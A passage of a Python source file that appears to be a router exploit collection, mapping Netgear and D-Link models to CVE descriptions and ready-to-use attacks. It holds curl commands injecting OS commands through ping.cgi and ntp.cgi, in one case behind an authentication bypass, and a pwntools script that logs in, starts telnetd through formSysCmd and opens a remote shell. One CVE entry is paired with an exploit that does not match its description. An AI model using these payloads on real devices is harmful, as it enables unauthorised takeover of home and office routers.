    curl -v 'http://192.168.0.1/ping.cgi?x=1.jpg&ping_IPAddr=;COMMAND;' --header "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:108.0) Gecko/20100101 Firefox/108.0" --header "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" --header "Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2" --header "Accept-Encoding: gzip, deflate" --header "Connection: close" --header "Upgrade-Insecure-Requests: 1"
    """
 ]
}

model_exp_dic["Netgear_WNDR3400"] = {
    "CVE-2019-17373":
["Certain NETGEAR devices allow unauthenticated access to critical .cgi and .htm pages via a substring ending with .jpg, such as by appending ?x=1.jpg to a URL. This affects MBR1515, MBR1516, DGN2200, DGN2200M, DGND3700, WNR2000v2, WNDR3300, WNDR3400, WNR3500, and WNR834Bv2.\n['https://github.com/zer0yu/CVE_Request/blob/master/netgear/Netgear_web_interface_exists_authentication_bypass.md']",
    """
    #unauthorized rce
    curl -v 'http://192.168.0.1/ping.cgi?x=1.jpg&ping_IPAddr=;COMMAND;' --header "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:108.0) Gecko/20100101 Firefox/108.0" --header "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" --header "Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2" --header "Accept-Encoding: gzip, deflate" --header "Connection: close" --header "Upgrade-Insecure-Requests: 1"
    """
 ]
}

model_exp_dic["Netgear_WNR3500"] = {
    "CVE-2019-17373":
["Certain NETGEAR devices allow unauthenticated access to critical .cgi and .htm pages via a substring ending with .jpg, such as by appending ?x=1.jpg to a URL. This affects MBR1515, MBR1516, DGN2200, DGN2200M, DGND3700, WNR2000v2, WNDR3300, WNDR3400, WNR3500, and WNR834Bv2.\n['https://github.com/zer0yu/CVE_Request/blob/master/netgear/Netgear_web_interface_exists_authentication_bypass.md']",
    """
    #unauthorized rce
    curl -v 'http://192.168.0.1/ping.cgi?x=1.jpg&ping_IPAddr=;COMMAND;' --header "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:108.0) Gecko/20100101 Firefox/108.0" --header "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" --header "Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2" --header "Accept-Encoding: gzip, deflate" --header "Connection: close" --header "Upgrade-Insecure-Requests: 1"
    """
 ]
}

model_exp_dic["Netgear_WNR834Bv2"] = {
    "CVE-2019-17373":
["Certain NETGEAR devices allow unauthenticated access to critical .cgi and .htm pages via a substring ending with .jpg, such as by appending ?x=1.jpg to a URL. This affects MBR1515, MBR1516, DGN2200, DGN2200M, DGND3700, WNR2000v2, WNDR3300, WNDR3400, WNR3500, and WNR834Bv2.\n['https://github.com/zer0yu/CVE_Request/blob/master/netgear/Netgear_web_interface_exists_authentication_bypass.md']",
    """
    #unauthorized rce
    curl -v 'http://192.168.0.1/ping.cgi?x=1.jpg&ping_IPAddr=;COMMAND;' --header "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:108.0) Gecko/20100101 Firefox/108.0" --header "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" --header "Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2" --header "Accept-Encoding: gzip, deflate" --header "Connection: close" --header "Upgrade-Insecure-Requests: 1"
    """
 ]
}

model_exp_dic["Netgear_WNDR3300"]  = {
    "CVE-2019-17373":
["Certain NETGEAR devices allow unauthenticated access to critical .cgi and .htm pages via a substring ending with .jpg, such as by appending ?x=1.jpg to a URL. This affects MBR1515, MBR1516, DGN2200, DGN2200M, DGND3700, WNR2000v2, WNDR3300, WNDR3400, WNR3500, and WNR834Bv2.\n['https://github.com/zer0yu/CVE_Request/blob/master/netgear/Netgear_web_interface_exists_authentication_bypass.md']",
    """
    #unauthorized rce
    curl -v 'http://192.168.0.1/ping.cgi?x=1.jpg&ping_IPAddr=;COMMAND;' --header "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:108.0) Gecko/20100101 Firefox/108.0" --header "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" --header "Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2" --header "Accept-Encoding: gzip, deflate" --header "Connection: close" --header "Upgrade-Insecure-Requests: 1"
    """
 ]
}


model_exp_dic["DIR-882"] = {
    "CVE-2020-8864":
    ["This vulnerability allows network-adjacent attackers to bypass authentication on affected installations of D-Link DIR-867, DIR-878, and DIR-882 routers with firmware 1.10B04. Authentication is not required to exploit this vulnerability. The specific flaw exists within the handling of HNAP login requests. The issue results from the lack of proper handling of empty passwords. An attacker can leverage this vulnerability to execute arbitrary code on the router. Was ZDI-CAN-9471.\n['https://supportannouncement.us.dlink.com/announcement/publication.aspx?name=SAP10157'\n'https://www.zerodayinitiative.com/advisories/ZDI-20-268/']",
    """
#affetc firmware 1.10B04
login set passord is NULL will success
    """
    ]
}

model_exp_dic["DIR-825vB"] = {
    "CVE-2019-9126":
["An issue was discovered on D-Link DIR-825 Rev.B 2.10 devices. There is an information disclosure vulnerability via requests for the router_info.xml document. This will reveal the PIN code, MAC address, routing table, firmware version, update time, QOS information, LAN information, and WLAN information of the device.['https://github.com/WhooAmii/whooamii.github.io/blob/master/2018/DIR-825/information%20disclosure.md']",
"""
auth rce
curl -H "Content-Type:application/json" -v -X POST -d {'ntp_server'='||COMMAND'}   http://192.168.0.1/ntp.cgi
"""
]
}

model_exp_dic["DIR-619L"] = {
    "CVE-2018-20057":
    ["An issue was discovered in /bin/boa on D-Link DIR-619L Rev.B 2.06B1 and DIR-605L Rev.B 2.12B1 devices. goform/formSysCmd allows remote authenticated users to execute arbitrary OS commands via the sysCmd POST parameter.['https://github.com/WhooAmii/whooamii.github.io/blob/master/2018/DIR-619%20command%20execution.md']",
    """
#affect firmware 2.06B1
import requests
import sys
import struct
import base64
from pwn import *
ip='192.168.0.1'
port=101
def login(user,password):
	postData = {
	'login_name':'',
	'curTime':'12345',
	'FILECODE':'',
	'VER_CODE':'',
	'VERIFICATION_CODE':'',
	'login_n':user,
	'login_pass':base64.b64encode(password),
	}
	response = requests.post('http://192.168.0.1/goform/formLogin',data=postData)
def syscmd(cmd):
	postData = {
	'sysCmd':cmd,
	'submit-url':'1234',
	}
	response = requests.post('http://192.168.0.1/goform/formSysCmd',data=postData)
def inter():
	p=remote(ip,port)
	p.interactive()
if __name__ == "__main__":
	login('admin','123456')
	syscmd('telnetd -p '+str(port))
	inter()
    """
    ]
}


# print(model_exp_dic["TOTOLINK_A7000R"][0])